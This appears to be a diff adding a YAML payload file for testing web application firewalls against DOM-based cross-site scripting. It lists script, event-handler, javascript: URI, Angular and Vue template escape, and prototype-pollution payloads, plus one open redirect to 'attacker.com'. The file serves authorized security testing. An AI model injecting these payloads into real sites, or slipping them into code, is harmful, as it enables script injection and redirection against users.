@@ -1,0 +1,136 @@
+# XSS DOM Payloads for WAF Bypass Testing
+# NOTE: These payloads are for authorized penetration testing to identify XSS vulnerabilities.
+# They target various DOM sinks that WAFs should protect against.
+name: "XSS DOM Payloads"
+description: "Cross-site scripting payloads for DOM-based XSS testing"
+attack_type: "xss"
+category: "dom"
+
+payloads:
+  # Location-based
+  - value: "#<script>alert(1)</script>"
+    description: "Hash-based script injection"
+    tags: ["hash", "script"]
+    context: "location.hash"
+
+  - value: "#<img src=x onerror=alert(1)>"
+    description: "Hash-based img injection"
+    tags: ["hash", "img"]
+    context: "location.hash"
+
+  # DOM sink payloads
+  - value: "<script>alert(1)</script>"
+    description: "For DOM write sinks"
+    tags: ["dom-sink"]
+    context: "DOM write sink"
+
+  - value: "');alert(1);//"
+    description: "Break out of string context"
+    tags: ["string-break"]
+    context: "string context"
+
+  # innerHTML sinks
+  - value: "<img src=x onerror=alert(1)>"
+    description: "For innerHTML sink"
+    tags: ["innerHTML"]
+    context: "innerHTML"
+
+  - value: "<svg onload=alert(1)>"
+    description: "SVG for innerHTML"
+    tags: ["innerHTML", "svg"]
+    context: "innerHTML"
+
+  # Timer function sinks
+  - value: "alert(1)"
+    description: "For timer string arg"
+    tags: ["timer"]
+    context: "timer function"
+
+  - value: "');alert(1);//"
+    description: "Break timer string"
+    tags: ["timer", "string-break"]
+    context: "timer function"
+
+  # jQuery sinks
+  - value: "<img src=x onerror=alert(1)>"
+    description: "For jQuery html method"
+    tags: ["jquery", "html"]
+    context: "jQuery.html()"
+
+  - value: "#<script>alert(1)</script>"
+    description: "jQuery selector injection"
+    tags: ["jquery", "selector"]
+    context: "jQuery selector"
+
+  # URL parameter pollution
+  - value: "javascript:alert(1)"
+    description: "For location assignment"
+    tags: ["location"]
+    context: "location.href"
+
+  - value: "//attacker.com"
+    description: "Protocol-relative redirect"
+    tags: ["location", "redirect"]
+    context: "location.href"
+
+  # postMessage sinks
+  - value: "{\"type\":\"<img src=x onerror=alert(1)>\"}"
+    description: "JSON with XSS in value"
+    tags: ["postMessage", "json"]
+    context: "postMessage"
+
+  # Template literal sinks
+  - value: "${alert(1)}"
+    description: "Template literal injection"
+    tags: ["template-literal"]
+    context: "template literal"
+
+  - value: "`${alert(1)}`"
+    description: "Full template with injection"
+    tags: ["template-literal"]
+    context: "template literal"
+
+  # Angular specific
+  - value: "{{constructor.constructor('alert(1)')()}}"
+    description: "Angular sandbox bypass"
+    tags: ["angular", "sandbox-bypass"]
+    context: "Angular template"
+
+  - value: "{{$on.constructor('alert(1)')()}}"
+    description: "Angular $on bypass"
+    tags: ["angular", "sandbox-bypass"]
+    context: "Angular template"
+
+  # Vue.js specific
+  - value: "{{_c.constructor('alert(1)')()}}"
+    description: "Vue template injection"
+    tags: ["vue", "template"]
+    context: "Vue template"
+
+  # React specific (unsafe patterns)
+  - value: "<img src=x onerror=alert(1)>"
+    description: "For unsafe innerHTML patterns"
+    tags: ["react", "innerHTML"]
+    context: "React innerHTML pattern"
+
+  # URL fragment payloads
+  - value: "#javascript:alert(1)"
+    description: "Fragment javascript URI"
+    tags: ["fragment", "javascript-uri"]
+    context: "fragment"
+
+  - value: "?q=<script>alert(1)</script>"
+    description: "Query param injection"
+    tags: ["query", "script"]
+    context: "query parameter"
+
+  # Prototype pollution leading to XSS
+  - value: "__proto__[innerHTML]=<img src=x onerror=alert(1)>"
+    description: "Prototype pollution XSS"
+    tags: ["prototype-pollution"]
+    context: "prototype pollution"
+
+  - value: "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>"
+    description: "Constructor prototype XSS"
+    tags: ["prototype-pollution"]
+    context: "prototype pollution"
